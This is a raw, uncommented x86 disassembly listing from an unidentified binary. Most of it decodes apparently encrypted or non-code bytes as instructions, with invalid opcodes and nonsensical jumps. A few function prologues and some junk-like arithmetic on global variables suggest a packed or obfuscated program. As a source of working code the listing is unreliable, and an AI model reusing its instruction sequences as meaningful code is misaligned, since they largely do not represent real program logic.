  40fb01:	jnp    0x40fb64
  40fb03:	inc    ebp
  40fb04:	lahf   
  40fb05:	push   0xffffffb9
  40fb07:	loop   0x40fae7
  40fb09:	jae    0x40fafe
  40fb0b:	loope  0x40fb8a
  40fb0d:	loop   0x40fb5e
  40fb0f:	push   0x7c888495
  40fb14:	or     eax,0xb6a8cdfd
  40fb19:	bnd jns 0x40fb82
  40fb1c:	jns    0x40faf6
  40fb1e:	icebp  
  40fb1f:	dec    ebx
  40fb20:	jo     0x40fad5
  40fb22:	xchg   BYTE PTR [edx+edx*1],bl
  40fb25:	fwait
  40fb26:	add    bl,BYTE PTR [esi+0x2edc2dfb]
  40fb2c:	adc    esi,DWORD PTR [ebp+0x201ddcf2]
  40fb32:	fs adc al,0xe5
  40fb35:	cld    
  40fb36:	cli    
  40fb37:	dec    edx
  40fb38:	cmp    ebp,DWORD PTR [eax]
  40fb3a:	fs mov cl,0x11
  40fb3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb3e:	jns    0x40fb39
  40fb40:	bound  edx,QWORD PTR ds:0x9147cbcb
  40fb46:	es or  eax,0xd998d778
  40fb4c:	setns  BYTE PTR es:[eax-0x12def7d]
  40fb54:	fadd   st,st(3)
  40fb56:	dec    esp
  40fb57:	pushf  
  40fb58:	enter  0x1fc4,0x34
  40fb5c:	in     eax,dx
  40fb5d:	xlat   BYTE PTR ds:[ebx]
  40fb5e:	mov    bh,0xec
  40fb60:	jb     0x40fb4a
  40fb62:	xchg   esi,eax
  40fb63:	icebp  
  40fb64:	inc    edx
  40fb65:	mov    ds:0xeab8088e,eax
  40fb6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb6b:	retf   
  40fb6c:	xor    BYTE PTR [edi-0x74],bl
  40fb6f:	jmp    0x44ec52c4
  40fb74:	push   edi
  40fb75:	int3   
  40fb76:	sbb    BYTE PTR [ecx+0x12c16926],dl
  40fb7c:	xchg   ebp,eax
  40fb7d:	aad    0x26
  40fb7f:	sar    DWORD PTR [eax],1
  40fb81:	jmp    0xc8cf6eb5
  40fb86:	adc    DWORD PTR [eax+eiz*2+0xc8d0589],esi
  40fb8d:	push   0xffffff82
  40fb8f:	mov    ax,0x5018
  40fb93:	mov    al,0x3c
  40fb95:	fwait
  40fb96:	test   DWORD PTR [edi-0x4a],esp
  40fb99:	xchg   BYTE PTR [eax],al
  40fb9b:	or     eax,0x2e67f557
  40fba0:	sub    eax,0x79860f4d
  40fba5:	stc    
  40fba6:	(bad)  
  40fba7:	call   FWORD PTR [ebx-0x48]
  40fbaa:	xor    al,BYTE PTR [ebp+0x5e5ff89c]
  40fbb0:	leave  
  40fbb1:	ret    0xc
  40fbb4:	push   ebp
  40fbb5:	mov    ebp,esp
  40fbb7:	jmp    0x40fed6
  40fbbc:	shl    DWORD PTR [esi-0x168e14bc],cl
  40fbc2:	jno    0x40fb6a
  40fbc4:	aad    0xf
  40fbc6:	xor    ebx,0x25
  40fbc9:	mov    dh,0x15
  40fbcb:	out    dx,eax
  40fbcc:	shl    BYTE PTR [esi+0x7d7c7e7e],1
  40fbd2:	jle    0x40fc52
  40fbd4:	sbb    eax,0x2bdbd5e9
  40fbd9:	mov    esi,0x3dbaf575
  40fbde:	mov    eax,ds:0xf581665f
  40fbe3:	pop    eax
  40fbe4:	xchg   ebp,eax
  40fbe5:	bound  ebx,QWORD PTR [ecx]
  40fbe7:	jo     0x40fbdc
  40fbe9:	inc    esi
  40fbea:	xchg   BYTE PTR [edi+0x3aa7c07],dl
  40fbf0:	and    BYTE PTR [esi+eiz*8+0x42],dl
  40fbf4:	pop    edx
  40fbf5:	xchg   esp,eax
  40fbf6:	xchg   ebx,eax
  40fbf7:	sub    ch,dh
  40fbf9:	dec    edi
  40fbfa:	rep outs dx,BYTE PTR ds:[esi]
  40fbfc:	les    edx,FWORD PTR [edi-0x6a830f8b]
  40fc02:	lods   al,BYTE PTR ds:[esi]
  40fc03:	loope  0x40fc70
  40fc05:	mov    dl,0x20
  40fc07:	adc    esi,DWORD PTR [ecx]
  40fc09:	mov    cl,0x21
  40fc0b:	fiadd  WORD PTR [edx-0x5b2092b6]
  40fc11:	jns    0x40fba9
  40fc13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc14:	jns    0x40fbbc
  40fc16:	xchg   DWORD PTR [ebx-0x4e],eax
  40fc19:	out    0x64,al
  40fc1b:	jmp    0x4cf25bb2
  40fc20:	dec    ebp
  40fc21:	jbe    0x40fc84
  40fc23:	ss rcr ch,cl
  40fc26:	jmp    0x40fc23
  40fc28:	mov    bl,0xd0
  40fc2a:	wbinvd 
  40fc2c:	aad    0x6c
  40fc2e:	push   ds
  40fc2f:	std    
  40fc30:	pop    edi
  40fc31:	lods   eax,DWORD PTR ds:[esi]
  40fc32:	push   edx
  40fc33:	inc    ecx
  40fc34:	xchg   esp,eax
  40fc35:	aas    
  40fc36:	xchg   edx,eax
  40fc37:	sub    DWORD PTR [edx-0xb],esp
  40fc3a:	shr    eax,1
  40fc3c:	popfw  
  40fc3e:	not    DWORD PTR [ebp+ebx*8+0x5b010d83]
  40fc45:	mov    ds:0xbf28a2ed,al
  40fc4a:	popf   
  40fc4b:	icebp  
  40fc4c:	adc    dl,BYTE PTR [edx-0x27bb5dbe]
  40fc52:	push   0x47
  40fc54:	mov    eax,ds:0x54497e15
  40fc59:	outs   dx,BYTE PTR ds:[esi]
  40fc5a:	and    al,0x20
  40fc5c:	clc    
  40fc5d:	or     BYTE PTR [edx],dh
  40fc5f:	pop    esi
  40fc60:	lods   eax,DWORD PTR ds:[esi]
  40fc61:	fcomp  DWORD PTR [ecx]
  40fc63:	imul   ebp,DWORD PTR [edi+eiz*4+0x76c41189],0xffffffb3
  40fc6b:	pop    ds
  40fc6c:	mov    ebp,0x97b8668d
  40fc71:	and    DWORD PTR ds:0x7a2b7e26,esi
  40fc77:	popf   
  40fc78:	mov    al,0xbc
  40fc7a:	inc    ebx
  40fc7b:	(bad)  
  40fc7c:	stos   DWORD PTR es:[edi],eax
  40fc7d:	ja     0x40fc46
  40fc7f:	pop    ebp
  40fc80:	xchg   ebp,eax
  40fc81:	inc    edi
  40fc82:	mov    ecx,0x92e73ab
  40fc87:	lods   al,BYTE PTR ds:[esi]
  40fc88:	test   eax,0xfb05ba37
  40fc8d:	stc    
  40fc8e:	std    
  40fc8f:	sbb    DWORD PTR ds:0x3c655270,ebp
  40fc95:	into   
  40fc96:	ret    0x4fde
  40fc99:	or     eax,edx
  40fc9b:	cmp    eax,0x271d8a39
  40fca0:	cli    
  40fca1:	nop
  40fca2:	stc    
  40fca3:	out    dx,al
  40fca4:	and    eax,0xd742df82
  40fca9:	js     0x40fd28
  40fcab:	push   ebp
  40fcac:	xor    DWORD PTR [ebx-0x3acdcd1b],0x4b81eb1c
  40fcb6:	loopne 0x40fc58
  40fcb8:	mov    al,0xe4
  40fcba:	out    dx,eax
  40fcbb:	xchg   ecx,eax
  40fcbc:	inc    edx
  40fcbd:	or     esp,edi
  40fcbf:	fstp   TBYTE PTR [ebx+0x7bc30ac0]
  40fcc5:	dec    ebx
  40fcc6:	and    eax,0xf7273121
  40fccb:	and    BYTE PTR [ecx+0x49],ch
  40fcce:	(bad)
  40fcd1:	outs   dx,BYTE PTR ds:[esi]
  40fcd2:	jbe    0x40fc98
  40fcd4:	sbb    bh,bl
  40fcd6:	out    dx,al
  40fcd7:	push   ebx
  40fcd8:	mov    ebp,0x3d2e0c46
  40fcdd:	loopne 0x40fd18
  40fcdf:	mov    al,ds:0xf8d25a31
  40fce4:	push   esp
  40fce5:	cmp    al,0xb5
  40fce7:	pop    edi
  40fce8:	fstp   TBYTE PTR [eax+0x14]
  40fceb:	adc    BYTE PTR [ecx+0x4a79e76e],cl
  40fcf1:	sub    BYTE PTR ds:0x535d80e2,bh
  40fcf7:	mov    eax,ds:0x6f852fa1
  40fcfc:	idiv   DWORD PTR [eax]
  40fcfe:	and    esp,ebx
  40fd00:	fcom   DWORD PTR [esp+ecx*4+0x671af96f]
  40fd07:	xchg   esi,eax
  40fd08:	stos   BYTE PTR es:[edi],al
  40fd09:	mov    ch,BYTE PTR [edx+0x132be0a5]
  40fd0f:	jecxz  0x40fcaf
  40fd11:	pusha  
  40fd12:	daa    
  40fd13:	sbb    al,BYTE PTR [eax-0x3c40b670]
  40fd19:	jnp    0x40fcf1
  40fd1b:	mov    ebx,0x5db1641
  40fd20:	ss hlt 
  40fd22:	xchg   ebx,eax
  40fd23:	xchg   esi,eax
  40fd24:	hlt    
  40fd25:	rcl    BYTE PTR [esi],cl
  40fd27:	xchg   esi,eax
  40fd28:	push   cs
  40fd29:	mov    al,ds:0x88765c58
  40fd2e:	shl    ebx,0xaf
  40fd31:	mov    ebx,0x559d84cc
  40fd36:	and    bh,BYTE PTR [esi+ebx*4+0x7ab6ff7c]
  40fd3d:	repz and DWORD PTR [eax+0x1a],ecx
  40fd41:	das    
  40fd42:	pusha  
  40fd43:	pushf  
  40fd44:	xor    al,BYTE PTR cs:[edi]
  40fd47:	jmp    0x40fd8a
  40fd49:	ss popa 
  40fd4b:	out    dx,eax
  40fd4c:	xor    DWORD PTR [edi],esi
  40fd4e:	repz sbb esp,ebp
  40fd51:	out    dx,al
  40fd52:	or     DWORD PTR [ecx-0x1d495a43],ecx
  40fd58:	lahf   
  40fd59:	sub    al,0x9a
  40fd5b:	test   eax,0x1c63b16e
  40fd60:	sti    
  40fd61:	mov    ecx,0xf18b7e82
  40fd66:	repz sbb DWORD PTR [edx+eax*2-0x66],ebp
  40fd6b:	aam    0x74
  40fd6d:	mov    bl,0xef
  40fd6f:	dec    ebx
  40fd70:	jmp    0x83a6:0x6635630d
  40fd77:	add    dh,ch
  40fd79:	mov    bl,dl
  40fd7b:	jmp    0x40fd5d
  40fd7d:	inc    esi
  40fd7e:	pop    esi
  40fd7f:	fld    st(2)
  40fd81:	cmp    bh,al
  40fd83:	test   al,0x7e
  40fd85:	mov    BYTE PTR [edx+edi*1-0x66],ah
  40fd89:	inc    ebx
  40fd8a:	shl    BYTE PTR [edx],cl
  40fd8c:	cdq    
  40fd8d:	(bad)  
  40fd8f:	pop    esp
  40fd90:	iret   
  40fd91:	jp     0x40fdb4
  40fd93:	scas   al,BYTE PTR es:[edi]
  40fd94:	pop    ecx
  40fd95:	out    0xed,eax
  40fd97:	int    0xa5
  40fd99:	dec    edx
  40fd9a:	push   eax
  40fd9b:	jl     0x40fd32
  40fd9d:	fcmovb st,st(6)
  40fd9f:	add    eax,ebx
  40fda1:	cli    
  40fda2:	and    DWORD PTR [edx],esp
  40fda4:	stc    
  40fda5:	push   eax
  40fda6:	cmp    ah,BYTE PTR [esi+esi*2-0x344795c]
  40fdad:	arpl   WORD PTR [bx+si-0x10],bx
  40fdb1:	das    
  40fdb2:	fwait
  40fdb3:	loopne 0x40fd9f
  40fdb5:	sar    ecx,1
  40fdb7:	pop    edi
  40fdb8:	add    DWORD PTR [eax],eax
  40fdba:	sbb    esi,edi
  40fdbc:	es xor al,0xba
  40fdbf:	lahf   
  40fdc0:	shl    dl,1
  40fdc2:	fisub  WORD PTR [ecx]
  40fdc4:	out    dx,eax
  40fdc5:	and    eax,0x5cc2ebb5
  40fdca:	sub    DWORD PTR [ebx+0x7c],ecx
  40fdcd:	sbb    edi,edx
  40fdcf:	js     0x40fdc3
  40fdd1:	xchg   BYTE PTR [eax+0x22],dl
  40fdd4:	clc    
  40fdd5:	push   cs
  40fdd6:	and    bh,cl
  40fdd8:	popa   
  40fdd9:	out    dx,eax
  40fdda:	dec    edi
  40fddb:	mov    ds:0x71fda2db,al
  40fde0:	xchg   esp,eax
  40fde1:	pop    ecx
  40fde2:	loope  0x40fe25
  40fde4:	push   edx
  40fde5:	out    dx,eax
  40fde6:	aaa    
  40fde7:	pop    eax
  40fde8:	add    BYTE PTR [ebx+0xa],dl
  40fdeb:	pusha  
  40fdec:	int3   
  40fded:	loop   0x40fe61
  40fdef:	push   edi
  40fdf0:	cwde   
  40fdf1:	sub    ecx,DWORD PTR ds:0x12a16eee
  40fdf7:	sbb    edi,esi
  40fdf9:	mov    ds:0xbfa7ca0a,al
  40fdfe:	ret    0xf578
  40fe01:	int    0x96
  40fe03:	imul   ebx,DWORD PTR [ebx],0x2c
  40fe06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe07:	fsubr  DWORD PTR [eax]
  40fe09:	xor    ecx,DWORD PTR [esi-0x24d955cc]
  40fe0f:	pop    si
  40fe11:	dec    edx
  40fe12:	lahf   
  40fe13:	iret   
  40fe14:	inc    ebp
  40fe15:	ret    0xc7bb
  40fe18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe19:	mov    ds:0xaaeb726b,eax
  40fe1e:	iret   
  40fe1f:	fld    QWORD PTR [esi]
  40fe21:	pop    ebx
  40fe22:	bound  edi,QWORD PTR [edx-0x42]
  40fe25:	and    DWORD PTR ds:0x8968894e,0x546a600a
  40fe2f:	mov    edi,0xd286c4ad
  40fe34:	(bad)  
  40fe36:	jmp    0xa602:0x79bba9e9
  40fe3d:	adc    BYTE PTR [eax-0x37cd02bb],0xd7
  40fe44:	push   ebp
  40fe45:	xchg   esi,eax
  40fe46:	rcr    BYTE PTR [edx-0x22],0xec
  40fe4a:	add    al,0xf5
  40fe4c:	mov    al,ds:0x6fe79ee7
  40fe51:	je     0x40fe6d
  40fe53:	sti    
  40fe54:	jno    0x40fe04
  40fe56:	in     al,dx
  40fe57:	stos   BYTE PTR es:[edi],al
  40fe58:	or     eax,0x3cbb4420
  40fe5d:	mov    ecx,0xbeb80e78
  40fe62:	cs push ecx
  40fe64:	(bad)  
  40fe65:	arpl   WORD PTR [esi-0x66bfec14],sp
  40fe6b:	das    
  40fe6c:	sbb    eax,0x23ef98f
  40fe71:	(bad)  
  40fe72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe73:	xor    ebx,DWORD PTR [esi+0x66]
  40fe76:	push   ds
  40fe77:	push   ecx
  40fe78:	test   al,0x36
  40fe7a:	ja     0x40fe91
  40fe7c:	out    dx,eax
  40fe7d:	repz pop eax
  40fe7f:	or     dl,BYTE PTR [ecx]
  40fe81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe82:	hlt    
  40fe83:	(bad)  
  40fe84:	out    dx,al
  40fe85:	push   ebx
  40fe86:	rol    BYTE PTR [esi-0x7874b9ab],1
  40fe8c:	sbb    cl,BYTE PTR ds:0x1bfe57ef
  40fe92:	pop    ebp
  40fe93:	pop    edi
  40fe94:	jecxz  0x40ff08
  40fe96:	ret    0xa2b9
  40fe99:	je     0x40fe72
  40fe9b:	push   eax
  40fe9c:	fnsave [ecx-0x59]
  40fe9f:	pop    edx
  40fea0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fea1:	int    0x86
  40fea3:	inc    eax
  40fea4:	and    eax,0x3d5873b6
  40fea9:	add    edi,DWORD PTR ds:0xf0fd57b5
  40feaf:	add    DWORD PTR [edx-0x3e],ebp
  40feb2:	out    dx,eax
  40feb3:	sub    BYTE PTR [ecx+0x5dfa4585],bh
  40feb9:	ret    
  40feba:	icebp  
  40febb:	fadd   QWORD PTR [ecx-0x6cca7ea]
  40fec1:	push   ebp
  40fec2:	jne    0x40fe66
  40fec4:	sbb    ah,BYTE PTR [ebp+0x3085fc4]
  40feca:	jmp    0xc5c2:0x58fbcfd0
  40fed1:	mul    DWORD PTR [edi-0x47]
  40fed4:	fild   WORD PTR [edi-0x75]
  40fed7:	inc    ebp
  40fed8:	or     al,0x33
  40feda:	sar    BYTE PTR [ecx+0x7264fca9],cl
  40fee0:	jmp    0x4101ff
  40fee5:	or     eax,0xf19cc125
  40feea:	pop    eax
  40feeb:	jno    0x40fea2
  40feed:	xchg   ecx,eax
  40feee:	add    eax,0xd08c4346
  40fef3:	xchg   ebx,eax
  40fef4:	cmp    eax,0x7e7eb5de
  40fef9:	jl     0x40ff78
  40fefb:	jle    0x40ff7b
  40fefd:	inc    ebx
  40fefe:	pop    esp
  40feff:	mov    bh,0xd8
  40ff01:	or     bl,BYTE PTR [ebx]
  40ff03:	mov    al,0x31
  40ff05:	and    ebp,0x553b3a8b
  40ff0b:	out    dx,eax
  40ff0c:	out    0x1d,al
  40ff0e:	fild   QWORD PTR [edi+eax*4]
  40ff11:	jnp    0x40fefc
  40ff13:	push   es
  40ff14:	xor    BYTE PTR [eax+0x6e718e19],0x8
  40ff1b:	aam    0x5a
  40ff1d:	out    dx,al
  40ff1e:	xchg   ebp,eax
  40ff1f:	call   0x9c01:0xb55b6b6b
  40ff26:	fdivr  QWORD PTR [esi+eiz*2-0x79e408e]
  40ff2d:	and    BYTE PTR cs:[eax+0x60],ah
  40ff31:	xor    cl,BYTE PTR [bx+di+0x61]
  40ff35:	inc    esi
  40ff36:	and    DWORD PTR [ebx],ebp
  40ff38:	sub    bh,BYTE PTR [esp+ebx*1-0x5b558409]
  40ff3f:	mov    ebp,0xb24d118a
  40ff44:	iret   
  40ff45:	ret    
  40ff46:	(bad)  
  40ff48:	pushf  
  40ff49:	lds    esp,FWORD PTR [edx+0x2c845562]
  40ff4f:	pop    edx
  40ff50:	jo     0x40ffb4
  40ff52:	mov    dl,0xf4
  40ff54:	sub    eax,0x8352702a
  40ff59:	aas    
  40ff5a:	dec    ebp
  40ff5b:	ins    DWORD PTR es:[edi],dx
  40ff5c:	sbb    DWORD PTR [bp+si],ecx
  40ff5f:	icebp  
  40ff60:	and    al,0x74
  40ff62:	cdq    
  40ff63:	cmp    edx,DWORD PTR [ecx]
  40ff65:	idiv   BYTE PTR [esi]
  40ff67:	mov    esi,0xd6d548e4
  40ff6c:	xchg   ebp,eax
  40ff6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff6e:	cs ins DWORD PTR es:[edi],dx
  40ff70:	aaa    
  40ff71:	retf   0x1f3d
  40ff74:	dec    ebx
  40ff75:	push   esp
  40ff76:	pop    ds
  40ff77:	lods   al,BYTE PTR ds:[esi]
  40ff78:	ret    0x90a2
  40ff7b:	fnstsw WORD PTR ds:0x7aa76e3c
  40ff81:	mov    edx,0x464fbc12
  40ff86:	pop    es
  40ff87:	aad    0xa3
  40ff89:	mov    dh,0xb3
  40ff8c:	outs   dx,DWORD PTR ds:[esi]
  40ff8d:	dec    edi
  40ff8e:	push   esp
  40ff8f:	cmp    esi,esp
  40ff91:	in     eax,0xf3
  40ff93:	push   esp
  40ff94:	and    edi,DWORD PTR [esi+eax*4-0x72bfaf6]
  40ff9b:	jp     0x40ffac
  40ff9d:	fcmovnbe st,st(2)
  40ff9f:	imul   ebp,DWORD PTR [edx+0x75],0x1
  40ffa3:	lea    ebx,ds:0x6d461c7
  40ffa9:	cs pusha 
  40ffab:	push   ebx
  40ffac:	addr16 je 0x410000
  40ffaf:	mov    ecx,0x7fdaa168
  40ffb4:	ficom  WORD PTR [eax+ebx*2+0x3b]
  40ffb8:	cmp    al,0xa3
  40ffba:	sub    al,0xd8
  40ffbd:	sub    DWORD PTR [esi-0x65],esp
  40ffc0:	sbb    BYTE PTR [eax],ch
  40ffc2:	sbb    eax,DWORD PTR [edi]
  40ffc4:	popf   
  40ffc5:	jns    0x40ffa2
  40ffc7:	sub    al,0x28
  40ffc9:	inc    esi
  40ffca:	(bad)  
  40ffcb:	das    
  40ffcc:	bound  eax,QWORD PTR [ecx+0x73cfda68]
  40ffd2:	mov    eax,0xa79859d4
  40ffd7:	jp     0x410051
  40ffd9:	or     BYTE PTR [edi],ch
  40ffdb:	test   eax,0xf6b77d8a
  40ffe0:	ror    esi,1
  40ffe2:	mov    ecx,0x92d621b7
  40ffe7:	ja     0x9db7a548
  40ffed:	(bad)  
  40ffee:	sbb    al,0x7b
  40fff0:	xlat   BYTE PTR ds:[ebx]
  40fff1:	(bad)  
  40fff2:	xlat   BYTE PTR ds:[ebx]
  40fff3:	push   esi
  40fff4:	xchg   ebx,eax
  40fff5:	dec    BYTE PTR [ebx+0x3c]
  40fff8:	mov    edx,0x5b5b0535
  40fffd:	pop    ebp
  40fffe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffff:	mov    ds:0xfbde9332,eax
  410004:	cli    
  410005:	jmp    0xb6a5cf17
  41000a:	sbb    ebp,DWORD PTR [eax]
  41000c:	add    ebx,DWORD PTR ds:0x7e79e44a
  410012:	daa    
  410013:	jbe    0x40ffd3
  410015:	mov    ss,WORD PTR [ebx-0x3b9f6e63]
  41001b:	adc    DWORD PTR [eax],edi
  41001d:	sub    DWORD PTR [esi+0x2e],edx
  410020:	rcl    BYTE PTR [ebx+0x51],cl
  410023:	sub    DWORD PTR gs:[ebx-0x22e36d9d],edx
  41002a:	cmp    al,0x48
  41002c:	pushf  
  41002d:	adc    eax,0x53557a64
  410032:	fdivr  QWORD PTR [edx]
  410034:	imul   edx,DWORD PTR [ecx+0x6e],0xffffffc2
  410038:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410039:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41003a:	je     0x410058
  41003c:	repz out 0x8b,eax
  41003f:	call   DWORD PTR [ebp-0x4d]
  410042:	stos   DWORD PTR es:[edi],eax
  410043:	and    eax,DWORD PTR fs:[edx]
  410046:	in     al,0xa0
  410048:	(bad)  
  410049:	push   esp
  41004a:	push   0xfffffff4
  41004c:	in     eax,dx
  41004d:	jg     0x410055
  41004f:	sbb    DWORD PTR [ecx-0x299517cf],edi
  410055:	mov    esp,0xd09c3a69
  41005a:	mov    dh,BYTE PTR [eax]
  41005c:	mov    esp,0x601463db
  410061:	adc    edi,edx
  410063:	test   DWORD PTR [edx],eax
  410065:	mov    cl,0x90
  410067:	pop    ecx
  410068:	inc    ebx
  410069:	fiadd  WORD PTR [eax-0x523d43f1]
  41006f:	jmp    0x77ef9f0f
  410074:	dec    ecx
  410075:	jne    0x410050
  410077:	cli    
  410078:	xchg   edi,eax
  410079:	lods   eax,DWORD PTR ds:[esi]
  41007a:	xor    dh,BYTE PTR [eax+0x32]
  41007d:	cmp    eax,0xc06e90a0
  410082:	inc    ebp
  410083:	inc    ecx
  410084:	stos   DWORD PTR es:[edi],eax
  410085:	add    al,0x11
  410087:	(bad)  
  410089:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41008a:	(bad)  
  41008b:	push   eax
  41008c:	and    al,0xf5
  41008e:	sti    
  41008f:	sub    dl,dl
  410091:	push   ebp
  410092:	adc    ecx,DWORD PTR [ebp-0x6e]
  410095:	js     0x41004d
  410097:	data16 jmp 0x410023
  41009a:	je     0x4100ba
  41009c:	and    al,0x43
  41009e:	shr    BYTE PTR [ecx],0xc2
  4100a1:	add    bl,BYTE PTR [eax+0x7b]
  4100a4:	xchg   edi,eax
  4100a5:	jae    0x410056
  4100a7:	mov    WORD PTR [ebx+0x3b],fs
  4100aa:	sbb    BYTE PTR [ecx+0x15fabf7e],dh
  4100b0:	push   ss
  4100b1:	cmp    DWORD PTR [edi+0x52e4248d],eax
  4100b7:	loop   0x4100d4
  4100b9:	and    DWORD PTR ss:[ebp+0x621e893d],esp
  4100c0:	push   eax
  4100c1:	mov    esi,0xa84b2421
  4100c6:	xor    bh,ch
  4100c8:	push   ecx
  4100c9:	xchg   ebx,eax
  4100ca:	jle    0x4100b6
  4100cc:	call   FWORD PTR [edi]
  4100ce:	and    ebp,DWORD PTR [edx+0x5e6dc200]
  4100d4:	sbb    dh,BYTE PTR [esi]
  4100d6:	sub    ebp,DWORD PTR [edx+0x65]
  4100d9:	popf   
  4100da:	sbb    bl,0xfb
  4100dd:	in     al,0xb
  4100df:	adc    BYTE PTR ds:0xb1da4d89,al
  4100e5:	xlat   BYTE PTR ds:[ebx]
  4100e6:	fistp  WORD PTR [edi-0x5e]
  4100e9:	scas   eax,DWORD PTR es:[edi]
  4100ea:	sbb    eax,0xfeced31b
  4100ef:	cli    
  4100f0:	jge    0x4100e3
  4100f2:	dec    edx
  4100f3:	xchg   DWORD PTR [ecx],edx
  4100f5:	or     BYTE PTR [edi],ch
  4100f7:	push   ecx
  4100f8:	dec    edx
  4100f9:	stos   BYTE PTR es:[edi],al
  4100fa:	out    0x4d,al
  4100fc:	data16 adc dl,dl
  4100ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410100:	inc    ecx
  410101:	pop    esi
  410102:	call   0x262b:0x4c213877
  410109:	jns    0x4100fb
  41010b:	pop    ebp
  41010c:	xchg   edx,eax
  41010d:	aam    0xf6
  41010f:	sti    
  410110:	push   ds
  410111:	xchg   BYTE PTR [edx+eax*2-0x2a764641],cl
  410118:	outs   dx,BYTE PTR ds:[esi]
  410119:	sub    esi,ebx
  41011b:	jge    0x41010c
  41011d:	fisttp QWORD PTR [edi]
  41011f:	adc    edx,DWORD PTR [eax+0x14996d74]
  410125:	cwde   
  410126:	pop    edx
  410127:	mov    bl,0x65
  410129:	cmp    DWORD PTR [edi+0xa],edx
  41012c:	or     DWORD PTR [edx-0x77],eax
  41012f:	arpl   WORD PTR [ecx],sp
  410131:	or     DWORD PTR [ecx+edi*1-0x10],ecx
  410135:	ins    BYTE PTR es:[edi],dx
  410136:	dec    esi
  410137:	daa    
  410138:	add    al,0x6f
  41013a:	(bad)  
  41013b:	je     0x4100f1
  41013d:	retf   
  41013e:	xor    eax,eax
  410140:	push   ecx
  410141:	cmp    dl,bh
  410143:	jae    0x410168
  410145:	sbb    BYTE PTR [eax],0x45
  410148:	and    eax,0xae569df0
  41014d:	jns    0x41018e
  41014f:	cmp    bh,0x62
  410152:	data16 sbb BYTE PTR [ebx+ecx*1-0x5b],bh
  410157:	ret    
  410158:	retf   
  410159:	cdq    
  41015a:	test   edx,esp
  41015c:	mov    DWORD PTR [ebp+0x3aa47665],ebp
  410162:	add    BYTE PTR [eax-0x2d934d7a],ah
  410168:	out    0xdf,al
  41016a:	test   eax,0x50e22e0f
  41016f:	mov    al,0x8
  410171:	xor    ebx,DWORD PTR [ebp+0xec37d8f]
  410177:	stc    
  410178:	std    
  410179:	mov    ebx,0x9ddf34c0
  41017e:	dec    ebx
  41017f:	paddw  mm7,mm5
  410182:	(bad)  
  410183:	or     ch,BYTE PTR [ebx+0x1f]
  410186:	call   0x42426acd
  41018b:	pusha  
  41018c:	mov    esp,0x14b824ae
  410191:	pusha  
  410192:	in     al,dx
  410193:	pop    esp
  410194:	cmp    al,0xaf
  410196:	test   BYTE PTR [ebx],ah
  410198:	repz inc esi
  41019a:	addr16 fcmove st,st(3)
  41019d:	inc    esp
  41019e:	loope  0x410178
  4101a0:	inc    eax
  4101a1:	cmc    
  4101a2:	sub    eax,0xf9138b9d
  4101a7:	outs   dx,DWORD PTR ds:[esi]
  4101a8:	(bad)  
  4101a9:	jne    0x41019b
  4101ab:	shl    BYTE PTR [esp+edi*8-0xe3dcba9],0x66
  4101b3:	mov    eax,ds:0x90c339d2
  4101b8:	lods   eax,DWORD PTR ds:[esi]
  4101b9:	xchg   esp,eax
  4101ba:	sbb    al,0x8a
  4101bc:	imul   edx,DWORD PTR [edx],0x6149e406
  4101c2:	bound  eax,QWORD PTR [eax+0x25b05587]
  4101c8:	enter  0x6815,0xa2
  4101cc:	cmp    BYTE PTR [edx+ebx*1-0x9],ah
  4101d0:	(bad)  
  4101d1:	cld    
  4101d2:	clc    
  4101d3:	jge    0x41022b
  4101d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101d6:	std    
  4101d7:	mov    bl,0x5e
  4101d9:	inc    edi
  4101da:	mov    ds:0xaf30482e,al
  4101df:	out    dx,al
  4101e0:	and    ecx,edi
  4101e2:	popf   
  4101e3:	inc    esi
  4101e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101e5:	ins    BYTE PTR es:[edi],dx
  4101e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101e7:	pusha  
  4101e8:	lea    ebx,[ebp+0x79ab1706]
  4101ee:	cmp    BYTE PTR [ebx+0x529a46c9],bl
  4101f4:	sahf   
  4101f5:	cld    
  4101f6:	loop   0x4101e0
  4101f8:	dec    ecx
  4101f9:	jae    0x4101b8
  4101fb:	nop
  4101fc:	xor    al,0x90
  4101fe:	mov    al,0xf7
  410200:	icebp  
  410201:	mov    ecx,DWORD PTR [ebp+0x10]
  410204:	and    ecx,eax
  410206:	or     ecx,0x81161d8f
  41020c:	mov    eax,ecx
  41020e:	pop    ebp
  41020f:	ret    0x18
  410212:	push   ebp
  410213:	mov    ebp,esp
  410215:	sub    esp,0x58
  410218:	mov    ecx,DWORD PTR ds:0x43371f
  41021e:	adc    DWORD PTR ds:0x433757,ecx
  410224:	mov    ecx,DWORD PTR [ebp+0x8]
  410227:	and    eax,0x4408
  41022c:	mov    eax,0x8a3c
  410231:	xor    ax,WORD PTR [ecx+0x20]
  410235:	sub    ecx,0x2534
  41023b:	mov    ecx,0x3b02
  410240:	or     DWORD PTR ds:0x43368b,0x3241
  41024a:	add    ax,cx
  41024d:	xor    DWORD PTR ds:0x4337ab,0x1afb
  410257:	movzx  eax,ax
  41025a:	and    ecx,0x4b4d
  410260:	mov    DWORD PTR [ebp-0xc],eax
  410263:	xor    ecx,ecx
  410265:	xor    ecx,DWORD PTR ds:0x43375f
  41026b:	or     DWORD PTR ds:0x433757,ecx
  410271:	mov    BYTE PTR [ebp-0x1],0x7f
  410275:	and    DWORD PTR ds:0x43372b,0x0
  41027f:	jmp    0x410291
  410284:	mov    ecx,DWORD PTR ds:0x43372b
  41028a:	inc    ecx
  41028b:	mov    DWORD PTR ds:0x43372b,ecx
  410291:	cmp    DWORD PTR ds:0x43372b,0x14
